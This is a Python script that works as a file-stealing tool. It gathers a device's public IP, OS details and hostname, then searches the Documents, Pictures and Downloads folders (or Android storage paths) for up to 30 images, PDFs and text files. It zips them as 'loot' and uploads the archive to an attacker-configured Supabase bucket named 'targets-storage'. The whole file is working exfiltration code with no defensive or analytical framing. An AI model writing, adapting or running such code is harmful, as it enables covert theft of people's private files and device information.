import os
import platform
import socket
import requests
import json
import zipfile
from supabase import create_client, Client


SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")

def get_device_intelligence():
    info = {}
    try:
        ip_resp = requests.get("https://api.ipify.org?format=json", timeout=5)
        info["public_ip"] = ip_resp.json().get("ip")
    except:
        info["public_ip"] = "Unknown"

    info["system"] = platform.system()
    info["release"] = platform.release()
    info["version"] = platform.version()
    info["machine"] = platform.machine()
    info["hostname"] = socket.gethostname()
    return info

def harvest_internal_storage():
    loot_files = []
    sys_type = platform.system()
    
    
    if sys_type in ["Windows", "Linux", "Darwin"]:
        base_search_paths = [
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Pictures"),
            os.path.expanduser("~/Downloads")
        ]
    else:
        base_search_paths = [
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Download"
        ]
    
    for path in base_search_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                if "sdcard1" in root.lower() or "extsd" in root.lower():
                    continue
                for file in files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png', '.pdf', '.txt')):
                        full_path = os.path.join(root, file)
                        loot_files.append(full_path)
                        if len(loot_files) >= 30:
                            break
                if len(loot_files) >= 30:
                    break
        if len(loot_files) >= 30:
            break
            
    return loot_files

if __name__ == "__main__":
    print("[*] Initializing automated internal storage collector...")
    
    intel = get_device_intelligence()
    internal_files = harvest_internal_storage()
    
    full_report = {
        "device_info": intel,
        "internal_files_count": len(internal_files)
    }
    
    report_file = "Internal_Storage_Report.json"
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(full_report, f, indent=4, ensure_ascii=False)
        
    
    loot_zip = "Internal_Loot_Payload.zip"
    with zipfile.ZipFile(loot_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
        if os.path.exists(report_file):
            zf.write(report_file)
        for f_path in internal_files:
            try:
                zf.write(f_path, arcname=os.path.basename(f_path))
            except:
                pass
                
    print(f"[+] Payload compressed: {loot_zip}")
    
    
    if SUPABASE_URL != "YOUR_SUPABASE_URL":
        try:
            supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
            with open(loot_zip, 'rb') as f:
                response = supabase.storage.from_("targets-storage").upload(
                    file=f,
                    path=f"loot/{loot_zip}",
                    file_options={"upsert": "true"}
                )
            print("[+] Target loot uploaded automatically to Supabase Storage!")
        except Exception as e:
            print("[-] Auto-upload error:", e)
    else:
        print("[-] Supabase credentials not set.")
